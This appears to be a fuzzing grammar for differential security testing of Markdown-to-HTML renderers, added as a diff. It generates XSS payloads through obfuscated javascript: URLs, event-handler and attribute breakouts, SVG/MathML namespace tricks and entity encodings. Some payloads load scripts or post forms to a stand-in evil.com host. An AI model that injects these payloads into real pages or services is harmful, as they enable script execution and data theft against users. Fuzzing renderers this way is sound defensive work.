@@ -1,0 +1,407 @@
+# =============================================================================
+# Markdown Grammar — Security Differential Fuzzing (v2)
+# Targets: markdown-to-HTML renderers (commonmark, marked, markdown-it, etc.)
+# Focus: XSS via links, images, raw HTML, entity encoding, escape breakouts
+#        GFM extensions, deep nesting, foreign namespaces, form/embed injection
+#
+# NOTE: Grammar parser uses <rule> syntax, conflicting with HTML <tag>.
+# We use <lt> rule to emit literal '<' character in HTML constructs.
+# =============================================================================
+
+!root <markdown_doc>
+!max_depth 10
+
+# Helper: literal '<' character (avoids parser treating <tag> as rule ref)
+<lt> = <
+
+# =============================================================================
+# Document structure: 1-4 blocks
+# =============================================================================
+<markdown_doc> = <block>
+<markdown_doc> = <block>\n\n<block>
+<markdown_doc> = <block>\n\n<block>\n\n<block>
+<markdown_doc> = <block>\n\n<block>\n\n<block>\n\n<block>
+
+# =============================================================================
+# Block types — weighted toward dangerous constructs
+# =============================================================================
+<block> = <link_block>
+<block> = <link_block>
+<block> = <link_block>
+<block> = <image_block>
+<block> = <image_block>
+<block> = <html_block>
+<block> = <html_block>
+<block> = <html_block>
+<block> = <autolink>
+<block> = <reference_link>
+<block> = <code_block>
+<block> = <heading>
+<block> = <emphasis>
+<block> = <paragraph>
+<block> = <entity_block>
+<block> = <backslash_escape>
+# New: GFM, deep nesting, foreign NS, form/embed
+<block> = <gfm_table>
+<block> = <gfm_table>
+<block> = <gfm_tasklist>
+<block> = <deep_nesting>
+<block> = <foreign_ns_block>
+<block> = <foreign_ns_block>
+<block> = <form_embed_block>
+<block> = <form_embed_block>
+<block> = <meta_block>
+
+# =============================================================================
+# Links (primary attack surface)
+# =============================================================================
+<link_block> = [<link_text>](<link_url>)
+<link_block> = [<link_text>](<link_url> "<link_title>")
+<link_block> = [<link_text>](<lt><link_url>>)
+<link_block> = [<link_text>](<link_url> '<link_title>')
+# New: parentheses in URL, space in angle brackets
+<link_block> = [<link_text>](<link_url_paren>)
+<link_block> = [<link_text>](<lt> <link_url> >)
+
+<link_text> = click
+<link_text> = <string min=3 max=15 charset=lower>
+<link_text> = <string min=1 max=8 charset=alphanumeric>
+<link_text> = <html_block>
+<link_text> = <entity_payload>
+# New: nested links (link inside link text)
+<link_text> = [inner](<link_url>)
+<link_text> = ![img](<image_src>)
+
+# --- Dangerous URL schemes ---
+<link_url> = javascript:alert(1)
+<link_url> = javascript:alert(document.domain)
+<link_url> = jAvAsCrIpT:alert(1)
+<link_url> = JAVASCRIPT:alert(1)
+<link_url> = JaVaScRiPt:alert(1)
+<link_url> = javascript&#58;alert(1)
+<link_url> = &#x6A;avascript:alert(1)
+<link_url> = &#106;avascript:alert(1)
+<link_url> = java\x09script:alert(1)
+<link_url> = java\x0ascript:alert(1)
+<link_url> = java\x0dscript:alert(1)
+<link_url> = \x20javascript:alert(1)
+<link_url> = data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+<link_url> = data:text/html,<lt>script>alert(1)<lt>/script>
+<link_url> = vbscript:MsgBox(1)
+
+# --- Benign URLs ---
+<link_url> = http://example.com
+<link_url> = https://example.com
+<link_url> = https://<string min=3 max=12 charset=lower>.com/<string min=0 max=20 charset=alphanumeric>
+<link_url> = //evil.com
+<link_url> = //<string min=3 max=12 charset=lower>.com
+
+# --- Escape/whitespace tricks ---
+<link_url> = \javascript:alert(1)
+<link_url> = java\nscript:alert(1)
+<link_url> = javascript\n:alert(1)
+<link_url> =  javascript:alert(1)
+<link_url> = \x01javascript:alert(1)
+# New: unicode whitespace/zero-width chars in scheme
+<link_url> = java\u00A0script:alert(1)
+<link_url> = java\u200Bscript:alert(1)
+<link_url> = java\uFEFFscript:alert(1)
+<link_url> = j\u0061vascript:alert(1)
+
+# --- URL with embedded credentials ---
+<link_url> = http://admin:password@evil.com
+<link_url> = javascript:alert(1)//http://safe.com
+
+# --- URL with parentheses (markdown-specific parsing challenge) ---
+<link_url_paren> = javascript:alert(1)
+<link_url_paren> = http://example.com/path(1)
+<link_url_paren> = javascript:void(0)
+<link_url_paren> = http://evil.com/a)javascript:alert(1)
+
+<link_title> = title
+<link_title> = <string min=3 max=20 charset=lower>
+<link_title> = " onclick="alert(1)
+<link_title> = " onmouseover="alert(1)
+<link_title> = ' onfocus='alert(1)
+# New: title attribute breakout
+<link_title> = "><lt>script>alert(1)<lt>/script>
+<link_title> = " style="background:url(javascript:alert(1))
+
+# =============================================================================
+# Images
+# =============================================================================
+<image_block> = ![<alt_text>](<image_src>)
+<image_block> = ![<alt_text>](<image_src> "<image_title>")
+<image_block> = ![<alt_text>](<image_src> '<image_title>')
+# New: nested image in link
+<image_block> = [![<alt_text>](<image_src>)](<link_url>)
+
+<alt_text> = img
+<alt_text> = <string min=1 max=10 charset=lower>
+<alt_text> = " onerror="alert(1)
+<alt_text> = <entity_payload>
+
+<image_src> = javascript:alert(1)
+<image_src> = x" onerror="alert(1)
+<image_src> = x' onerror='alert(1)
+<image_src> = http://example.com/img.png
+<image_src> = x
+<image_src> = <string min=3 max=20 charset=lower>.png
+<image_src> = onerror=alert(1)//
+# New: data URI images
+<image_src> = data:image/svg+xml,<lt>svg onload="alert(1)"><lt>/svg>
+<image_src> = data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4=
+
+<image_title> = " onerror="alert(1)
+<image_title> = title
+<image_title> = <string min=3 max=15 charset=lower>
+
+# =============================================================================
+# HTML blocks (raw HTML in markdown — major attack surface)
+# Uses <lt> rule for literal '<' to avoid grammar parser conflict.
+# =============================================================================
+<html_block> = <lt>script>alert(1)<lt>/script>
+<html_block> = <lt>script>alert(document.domain)<lt>/script>
+<html_block> = <lt>script src="http://evil.com/xss.js"><lt>/script>
+<html_block> = <lt>sCrIpT>alert(1)<lt>/sCrIpT>
+<html_block> = <lt>iframe src="javascript:alert(1)"><lt>/iframe>
+<html_block> = <lt>iframe srcdoc="&lt;img src=x onerror=alert(1)&gt;"><lt>/iframe>
+<html_block> = <lt>div <event_handler>>test<lt>/div>
+<html_block> = <lt>svg <event_handler>><lt>/svg>
+<html_block> = <lt>svg onload="alert(1)">
+<html_block> = <lt>img src=x <event_handler>>
+<html_block> = <lt>img src=x onerror=alert(1)>
+<html_block> = <lt>img/src=x onerror=alert(1)>
+<html_block> = <lt>form action="http://evil.com"><lt>input type="text"><lt>input type="submit"><lt>/form>
+<html_block> = <lt>object data="javascript:alert(1)"><lt>/object>
+<html_block> = <lt>embed src="javascript:alert(1)">
+<html_block> = <lt>style>body{background:url('javascript:alert(1)')}<lt>/style>
+<html_block> = <lt>details open ontoggle="alert(1)"><lt>summary>click<lt>/summary><lt>/details>
+<html_block> = <lt>video><lt>source onerror="alert(1)"><lt>/video>
+<html_block> = <lt>audio src=x onerror=alert(1)>
+<html_block> = <lt>body onload="alert(1)">
+<html_block> = <lt>input onfocus="alert(1)" autofocus>
+<html_block> = <lt>a href="javascript:alert(1)">click<lt>/a>
+<html_block> = <lt>base href="http://evil.com/">
+<html_block> = <lt>meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<html_block> = <lt>math><lt>mtext><lt>img src=x onerror=alert(1)><lt>/mtext><lt>/math>
+# New: more exotic HTML payloads
+<html_block> = <lt>select><lt>option><lt>img src=x onerror=alert(1)><lt>/option><lt>/select>
+<html_block> = <lt>marquee onstart=alert(1)>
+<html_block> = <lt>isindex action="javascript:alert(1)">
+<html_block> = <lt>table background="javascript:alert(1)">
+
+<event_handler> = onmouseover="alert(1)"
+<event_handler> = onclick="alert(1)"
+<event_handler> = onerror="alert(1)"
+<event_handler> = onload="alert(1)"
+<event_handler> = onfocus="alert(1)" autofocus
+<event_handler> = onblur="alert(1)"
+<event_handler> = ontoggle="alert(1)"
+# New: more event handlers for type-level divergence
+<event_handler> = onanimationend="alert(1)"
+<event_handler> = onpointerenter="alert(1)"
+<event_handler> = onwheel="alert(1)"
+<event_handler> = ondrag="alert(1)"
+<event_handler> = onpaste="alert(1)"
+<event_handler> = oncontextmenu="alert(1)"
+<event_handler> = onresize="alert(1)"
+
+# =============================================================================
+# Foreign namespace blocks (SVG/MathML — namespace confusion)
+# =============================================================================
+<foreign_ns_block> = <lt>svg><lt>foreignObject><lt>div <event_handler>>x<lt>/div><lt>/foreignObject><lt>/svg>
+<foreign_ns_block> = <lt>math><lt>mi><lt>a href="javascript:alert(1)">x<lt>/a><lt>/mi><lt>/math>
+<foreign_ns_block> = <lt>svg><lt>a xlink:href="javascript:alert(1)"><lt>text>click<lt>/text><lt>/a><lt>/svg>
+<foreign_ns_block> = <lt>svg><lt>set attributeName="onmouseover" to="alert(1)"><lt>/svg>
+<foreign_ns_block> = <lt>svg><lt>animate onbegin="alert(1)"><lt>/svg>
+<foreign_ns_block> = <lt>math><lt>annotation-xml encoding="text/html"><lt>img src=x onerror=alert(1)><lt>/annotation-xml><lt>/math>
+<foreign_ns_block> = <lt>svg><lt>desc><lt>img src=x onerror=alert(1)><lt>/desc><lt>/svg>
+<foreign_ns_block> = <lt>math><lt>maction actiontype="statusline"><lt>mtext>click<lt>/mtext><lt>mtext>javascript:alert(1)<lt>/mtext><lt>/maction><lt>/math>
+
+# =============================================================================
+# Form and embed injection blocks
+# =============================================================================
+<form_embed_block> = <lt>form action="http://evil.com"><lt>button>submit<lt>/button><lt>/form>
+<form_embed_block> = <lt>form><lt>button formaction="javascript:alert(1)">click<lt>/button><lt>/form>
+<form_embed_block> = <lt>input type="image" src=x onerror=alert(1)>
+<form_embed_block> = <lt>object type="text/html" data="http://evil.com"><lt>/object>
+<form_embed_block> = <lt>embed type="text/html" src="data:text/html,<lt>script>alert(1)<lt>/script>">
+<form_embed_block> = <lt>applet code="evil.class" archive="http://evil.com/evil.jar"><lt>/applet>
+<form_embed_block> = <lt>form id="f"><lt>/form><lt>input form="f" onfocus="alert(1)" autofocus>
+<form_embed_block> = <lt>textarea><lt>img src=x onerror=alert(1)><lt>/textarea>
+
+# =============================================================================
+# Meta/base tag injection
+# =============================================================================
+<meta_block> = <lt>base href="http://evil.com/">
+<meta_block> = <lt>base target="_blank">
+<meta_block> = <lt>meta http-equiv="refresh" content="0;url=http://evil.com">
+<meta_block> = <lt>meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">
+<meta_block> = <lt>meta name="referrer" content="no-referrer">
+
+# =============================================================================
+# GFM tables (GitHub Flavored Markdown specific)
+# =============================================================================
+<gfm_table> = | <gfm_cell> | <gfm_cell> |\n| --- | --- |\n| <gfm_cell> | <gfm_cell> |
+<gfm_table> = | header |\n| --- |\n| <gfm_cell> |
+<gfm_table> = | a | b | c |\n|---|---|---|\n| <gfm_cell> | <gfm_cell> | <gfm_cell> |
+
+<gfm_cell> = <link_block>
+<gfm_cell> = <html_block>
+<gfm_cell> = <entity_payload>
+<gfm_cell> = <string min=2 max=15 charset=lower>
+<gfm_cell> = <lt>img src=x <event_handler>>
+<gfm_cell> = [<link_text>](<link_url>)
+<gfm_cell> = <lt>a href="javascript:alert(1)">x<lt>/a>
+
+# =============================================================================
+# GFM task lists
+# =============================================================================
+<gfm_tasklist> = - [ ] <link_block>
+<gfm_tasklist> = - [x] <html_block>
+<gfm_tasklist> = - [ ] <link_block>\n- [x] <html_block>
+<gfm_tasklist> = - [<entity_payload>] task
+<gfm_tasklist> = - [ ] <lt>img src=x <event_handler>>
+
+# =============================================================================
+# Deep nesting (parser depth limit divergence)
+# =============================================================================
+<deep_nesting> = <nest_emphasis>
+<deep_nesting> = <nest_blockquote>
+<deep_nesting> = <nest_list>
+
+<nest_emphasis> = *_**_***<html_block>***_**_*
+<nest_emphasis> = **__***___<link_block>___***__**
+<nest_emphasis> = ~~*_**<html_block>**_*~~
+<nest_emphasis> = *_*_*_*_*_*_*_<link_block>_*_*_*_*_*_*_*
+
+<nest_blockquote> = > <link_block>
+<nest_blockquote> = > > <html_block>
+<nest_blockquote> = > > > <link_block>
+<nest_blockquote> = > > > > > <html_block>
+<nest_blockquote> = > > > > > > > > <link_block>
+
+<nest_list> = - - - <link_block>
+<nest_list> = 1. 1. 1. <html_block>
+<nest_list> = - 1. - 1. <link_block>
+<nest_list> = - - - - - - - - <html_block>
+
+# =============================================================================
+# Autolinks (markdown autolink syntax uses < > which conflicts with grammar)
+# =============================================================================
+<autolink> = <lt>javascript:alert(1)>
+<autolink> = <lt>http://example.com>
+<autolink> = <lt>https://example.com>
+<autolink> = http://example.com
+<autolink> = https://<string min=3 max=12 charset=lower>.com
+<autolink> = <lt>mailto:test@example.com>
+<autolink> = <lt>vbscript:MsgBox(1)>
+# New: edge case autolinks
+<autolink> = <lt>data:text/html,<lt>script>alert(1)<lt>/script>>
+<autolink> = www.<string min=3 max=10 charset=lower>.com
+<autolink> = <lt>JAVASCRIPT:alert(1)>
+<autolink> = <lt> javascript:alert(1) >
+
+# =============================================================================
+# Reference-style links
+# =============================================================================
+<reference_link> = [<link_text>][ref]\n\n[ref]: <link_url>
+<reference_link> = [<link_text>][ref]\n\n[ref]: <link_url> "<link_title>"
+<reference_link> = [<link_text>][ref]\n\n[ref]: <lt><link_url>>
+<reference_link> = [<link_text>][]\n\n[<link_text>]: <link_url>
+# New: multiline reference definitions, duplicate labels
+<reference_link> = [<link_text>][a]\n[<link_text>][b]\n\n[a]: <link_url>\n[b]: https://safe.com
+<reference_link> = [<link_text>][ref]\n\n[ref]: javascript:alert(1)\n[ref]: https://safe.com
+<reference_link> = [<link_text>][ref]\n\n[REF]: <link_url>
+
+# =============================================================================
+# Code blocks (test escape/breakout)
+# =============================================================================
+<code_block> = `<html_payload>`
+<code_block> = ``<html_payload>``
+<code_block> = ```\n<html_payload>\n```
+<code_block> = ```html\n<html_payload>\n```
+<code_block> = ```javascript\n<html_payload>\n```
+<code_block> =     <html_payload>
+<code_block> = ~~~\n<html_payload>\n~~~
+<code_block> = ```\n<html_payload>\n````
+<code_block> = ````\n<html_payload>\n```
+# New: language-specific breakout
+<code_block> = ```<string min=1 max=5 charset=lower> <event_handler>\n<html_payload>\n```
+<code_block> = ```\ntest\n```\n<html_block>
+<code_block> = ~~~html\ntest\n~~~\n\n<html_block>
+
+<html_payload> = <lt>script>alert(1)<lt>/script>
+<html_payload> = <lt>img src=x onerror=alert(1)>
+<html_payload> = <string min=5 max=30 charset=lower>
+
+# =============================================================================
+# Headings
+# =============================================================================
+<heading> = # <link_block>
+<heading> = ## <link_block>
+<heading> = ### <html_block>
+<heading> = ## <paragraph>
+<heading> = <paragraph>\n===
+<heading> = <paragraph>\n---
+<heading> = # <entity_payload>
+# New: heading with id attribute injection
+<heading> = # <link_block> {#<string min=3 max=10 charset=lower>}
+
+# =============================================================================
+# Emphasis / strong (nesting attacks)
+# =============================================================================
+<emphasis> = *<html_block>*
+<emphasis> = **<html_block>**
+<emphasis> = ***<html_block>***
+<emphasis> = _<link_block>_
+<emphasis> = __<link_block>__
+<emphasis> = ___<link_block>___
+<emphasis> = *<emphasis>*
+<emphasis> = _**<html_block>**_
+<emphasis> = ~~<html_block>~~
+
+# =============================================================================
+# Entity-encoded payloads
+# =============================================================================
+<entity_block> = <entity_payload>
+<entity_block> = [<entity_payload>](<link_url>)
+
+<entity_payload> = &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+<entity_payload> = &#60;script&#62;alert(1)&#60;/script&#62;
+<entity_payload> = &lt;script&gt;alert(1)&lt;/script&gt;
+<entity_payload> = &#x3C;img src=x onerror=alert(1)&#x3E;
+<entity_payload> = &#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)
+<entity_payload> = &NewLine;javascript:alert(1)
+<entity_payload> = &Tab;javascript:alert(1)
+<entity_payload> = &#0000106;avascript:alert(1)
+# New: mixed encoding, overlong, numeric entities for event handlers
+<entity_payload> = &#x6F;&#x6E;&#x6C;&#x6F;&#x61;&#x64;=alert(1)
+<entity_payload> = &#x3C;svg/&#x6F;&#x6E;load=alert(1)&#x3E;
+<entity_payload> = &lt;base href=&quot;http://evil.com&quot;&gt;
+
+# =============================================================================
+# Backslash escapes at interesting positions
+# =============================================================================
+<backslash_escape> = \[<link_text>](<link_url>)
+<backslash_escape> = [\<link_text>](<link_url>)
+<backslash_escape> = [<link_text>]\(<link_url>)
+<backslash_escape> = [<link_text>](<link_url>\)
+<backslash_escape> = \*<html_block>\*
+<backslash_escape> = \`<html_block>\`
+<backslash_escape> = [<link_text>](<backslash_url>)
+
+<backslash_url> = java\script:alert(1)
+<backslash_url> = javas\\cript:alert(1)
+<backslash_url> = \\javascript:alert(1)
+<backslash_url> = java\x73cript:alert(1)
+<backslash_url> = java\/script:alert(1)
+
+# =============================================================================
+# Plain paragraphs (filler / context)
+# =============================================================================
+<paragraph> = <string min=5 max=50 charset=lower>
+<paragraph> = <string min=10 max=30 charset=alphanumeric>
+<paragraph> = <link_block> <string min=3 max=20 charset=lower>
+<paragraph> = <string min=3 max=10 charset=lower> <link_block> <string min=3 max=10 charset=lower>
